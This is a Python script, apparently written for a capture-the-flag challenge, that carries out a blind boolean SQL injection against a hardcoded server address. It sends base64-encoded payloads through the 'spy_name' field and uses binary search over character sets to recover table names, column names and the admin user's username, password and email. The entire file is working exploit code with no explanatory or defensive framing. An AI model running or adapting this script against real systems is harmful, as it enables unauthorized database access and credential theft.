import requests, urllib, re, sys, base64

url_base = "http://128.199.224.175:24000"

sessid = requests.Session()

init_array = []
debug_mode = True
fancy_console = False

ASCIIAlphabet = "\001 !\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
simpleAlphabet = "\001abcdefghijklmnopqrstuvwxyz"
HEXAlphabet = "\0010123456789abcdef"
advancedAlphabet= "\0010123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz"

users_creds_payload = "alix' AND Ascii(substring((SELECT CONCAT(username, ';', password, ';', email) FROM users WHERE username='admin'  OR 1 LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@#"
tables_payload = "alix' AND Ascii(substring((SELECT table_name FROM information_schema.tables WHERE table_schema = database() LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@#"

columns_users_payload = "alix' AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'users' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@#"
columns_spies_payload = "alix' AND Ascii(substring((SELECT column_name FROM information_schema.columns WHERE table_name = 'spies' LIMIT @rOFFSET@,1),@wOFFSET@,1))>@cORD@#"

def printInPlace(alert):
	if fancy_console:
		sys.stdout.write("{}{}".format(alert, "\b"*len(alert)))
		sys.stdout.flush();
	return fancy_console

def createPayload( query ):
	return {"spy_name": base64.b64encode(query) }
def __debug(string):
	if debug_mode == True: print ("exec: {}".format(query))
	return debug_mode
	
def sendPayload ( query ):
	__debug("exec: {}".format(query))
	payload = createPayload(query)
	delete = sessid.post(url_base, payload)
	return resultCompare(delete.text)

def logIn():
	print ("loggin in: ")
	sessid.get(url_base, allow_redirects=True)
	return

def resultCompare(text):
	regex = re.compile(r"images/([^']+)")
	matches = regex.findall(text)
	return matches

def tryPayload(str):
	global init_array
	init_array = sendPayload(str)
	return 1 == len(init_array)

#bin-search ASCII inside [alphabet]
def findName(payload, alphabet):
	a = 0
	b = len(alphabet)-1
	while (a < b):
		mid = (a+b)//2
		c = alphabet[mid]
		printInPlace(c)
		if tryPayload(payload
			.replace("@cORD@", str(ord(c)))
			): a = mid + 1
		else:
			b = mid
	return alphabet[a]


def findNames(payload, alphabet):
	for result_offset in range(0, 10):
		result = ""
		pl = payload.replace("@rOFFSET@", str(result_offset))
		for word_offset in range(1, 40):
			pl2 = pl.replace("@wOFFSET@", str(word_offset))
			c = findName(pl2, alphabet)
			if c == alphabet[0]: break
			sys.stdout.write(c)
			sys.stdout.flush
			result+=c
		print(" ")
		if len(result) <= 1: break
	return


def findTables():
	print ("..:: Searching for table names ::..")
	findNames(tables_payload, advancedAlphabet)

def findSpiesColumns():
	print ("..:: Searching for column names in spies ::..")
	findNames(columns_spies_payload, advancedAlphabet)

def findUsersColumns():
	print ("..:: Searching for column names in user::..")
	findNames(columns_users_payload, advancedAlphabet)


def findUsersCreds():
	print ("..:: Searching for users and their creds ::..")
	findNames(users_creds_payload, ASCIIAlphabet)



fancy_console = True # Turn on fancy terminal output
debug_mode = False # Turn off debugging mode
logIn();


init_array = sendPayload("alix");

# findTables();
# findUsersColumns();
# findSpiesColumns();
findUsersCreds();



